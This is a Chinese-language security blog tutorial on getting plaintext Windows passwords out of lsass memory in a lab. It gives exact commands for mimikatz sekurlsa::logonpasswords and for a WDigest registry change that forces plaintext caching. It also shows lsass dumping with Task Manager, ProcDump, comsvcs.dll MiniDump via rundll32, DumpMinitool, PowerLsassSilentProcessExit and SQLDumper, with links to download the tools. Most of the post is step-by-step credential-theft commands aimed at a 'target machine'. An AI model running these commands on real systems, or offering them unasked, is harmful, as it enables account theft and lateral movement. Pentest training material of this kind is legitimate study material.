---
title: Windows明文密码获取
description: Windows明文密码获取
pubDate: 01 19 2025
image: https://img.trtyr.top/images/blog/Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/001%20Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-16.webp
categories:
  - 网络安全
tags:
  - 密码抓取
  - 其他
---

密码抓取，我们得先知道密码可能在哪。在 NTLM 那里，我们介绍了一个 `SAM` 文件，当用户在登录界面，输入账户密码时，`winlogon` 进程会将用户输入的密码传给 `lsass` 进程。此时 `lsass` 进程里面会有一份明文账户密码，然后经过 `NTLM Hash` 处理，把处理到的结果和 `SAM` 文件进行对比，判断用户是否能够登录成功。

所以这个明文密码，就是利用 `lsass` 进程会在内存中保存明文密码这一点进行操作。

> 注意：在安装了 `KB2871997` 补丁的系统以及 `WIN 10` 或 `WIN 2012` 以上, 默认不在内存中保存明文密码

## 利用 Mimikatz 直接获取明文密码

我们在 `Win7` 环境中进行测试。此方法可以获取到**登录过的**用户的明文密码

正常工作组用户 `trtyr:admin!123` 使用 `mimikatz.exe`

```shell
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords fill" "exit"
```

![](https://img.trtyr.top/images/blog/Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/001%20Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-2.webp)

可以看到，左侧是普通权限，运行命令出现了错误；右侧获取到了 `WIN7` 本地工作组的明文账号密码 `trtyr:admin!123`，以及用户的 `NTLM Hash`。而且下面还获取到了两个域用户的明文账号密码

![](https://img.trtyr.top/images/blog/Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/001%20Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-3.webp)

我们接着使用域账号 `TRTYR\trtyr:root` 登录，试试效果。

![](https://img.trtyr.top/images/blog/Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/001%20Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-4.webp)

可以看到效果一样。

## 修改注册表获取明文密码

有的时候会出现这种情况

![](https://img.trtyr.top/images/blog/Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/001%20Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-5.webp)

这是因为系统默认禁止在内存缓存中保存明文密码，`Password` 字段显示为 `null`。此时可以通过修改注册表的方式抓取明文

```
# 允许保存明文密码
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

# 禁止保存明文密码，默认值
reg add HKLMSYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
```

![](https://img.trtyr.top/images/blog/Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/001%20Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-6.webp)

在显示"操作成功"后，需要**用户重新登录**才可生效。

![](https://img.trtyr.top/images/blog/Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/001%20Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-7.webp)

现在登录的是 `TRTYR\administrator` 用户，切换到 `TRTYR\trtyr` 用户

![](https://img.trtyr.top/images/blog/Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/001%20Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-8.webp)

获取 `TRTYR\trtyr` 的明文密码。

## 转储lsass.exe进程

如果由于某些原因无法将 `mimikazt` 上传至目标机器，可以将 `lsass.exe` 进程进行转储。

### 任务管理器转储

在 `任务管理器` 的 `详细信息` 里，找到 `lsass.exe`，然后右键选择 `创建转储文件`，随后就会在目标位置生成一个 `lsass.DMP`

![](https://img.trtyr.top/images/blog/Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/001%20Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-9.webp)

把这个拿出来，和自己的 `mimikazt` 放在一起，执行命令

```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" "exit"
```

得到目标当前登录的域用户的密码信息。

![](https://img.trtyr.top/images/blog/Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/001%20Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-10.webp)

### ProcDump(白名单) 转储

微软自己有一个工具，`ProcDump`，它是一个命令行实用工具，其主要用途是在管理员或开发人员可用于确定峰值原因的峰值期间监视 CPU 峰值和生成故障转储的应用程序。

> 下载地址：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump

将程序上传到目标靶机，然后执行命令创建 `lsass` 的转储文件

```
Procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

该操作需要管理员权限

![](https://img.trtyr.top/images/blog/Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/001%20Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-11.webp)

然后就是和上面的一样了

### Comsvcs.dll 转储

`comsvcs.dll` 是 Windows 操作系统中的一个动态链接库（DLL），负责提供 `Component Services` 的核心功能。这个组件服务是一个用于构建分布式、可重用组件的系统，其中使用了 `COM` 和事务处理。

`comsvcs.dll` 作为Windows自带的DLL文件，它包含了一个名为 `MiniDump` 的函数，而该函数底层调用了 `MiniDumpWriteDump` 接口，我们可以利用该函数创建指定进程的转储文件。

1. 获取 `lsass` 进程 `PID`

```shell
tasklist | findstr /i lsass
```

![](https://img.trtyr.top/images/blog/Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/001%20Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-12.webp)

2. 开启`SeDebugPrivilege`特权

利用 `comsvcs.dll` 导出转储文件，还需要开启 `SeDebugPrivilege` 权限，但是 `cmd` 本身是禁用 `SeDebugPrivilege` 特权的。我们可以直接使用 `powershell` 进行操作，因为 `powerhsell` 默认是启用。

```
powershell rundll32.exe comsvcs.dll,MiniDump 696 C:\Users\trtyr.TRTYR\Desktop\lsass.dmp full
```

![](https://img.trtyr.top/images/blog/Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/001%20Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-13.webp)

然后就是用 `mimikatz` 读取 `lsass.dmp`

### DumpMinitool 转储

这是 `VS 2022` 自带的一个工具，可以利用该程序来导出 `lsass` 进程。

> 下载链接：https://pan.baidu.com/s/1szIjSGscsg1KeQOKSuM3kg?pwd=weq6

运行命令

```shell
DumpMinitool.exe --file lsass.dmp --processId 696 --dumpType Full
```

生成的 `lsass.dmp` 去 `mimikatz` 导出就行了。

### # PowerLsassSilentProcessExit 转储

这是一个 `ps` 脚本，会在目标位置生成一个文件夹，文件夹内会生成两个 `dmp`，一个是目标进程，也就是 `lsass` 的转储文件，一个是 `powershell` 的 `dmp`

> 下载链接：https://github.com/CompassSecurity/PowerLsassSilentProcessExit

执行命令

```powershell
Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
PS C:\Users\trtyr.TRTYR\Desktop> .\PowerLsassSilentProcessExit.ps1 -DumpMode 0 -DumpPath C:\Users\trtyr.TRTYR\Desktop
```

得到文件夹，内容如下

![](https://img.trtyr.top/images/blog/Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/001%20Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-14.webp)

使用 `mimikatz` 导出就行了

### SQLDumper(白名单) 转储

`Sqldumper.exe` 实用工具包含在 `Microsoft SQL Serve` r 中。它生成用于调试目的 `SQL Server` 和相关进程的内存转储。

`SQLDumper.exe` 包含在 `Microsoft SQL` 和 `Office` 中，可生成完整转储文件。

```
tasklist /svc | findstr lsass.exe  查看lsass.exe 的PID号
Sqldumper.exe <ProcessID> 0 0x01100  导出mdmp文件
```

![](https://img.trtyr.top/images/blog/Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/001%20Windows%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-15.webp)

然后本地解密即可
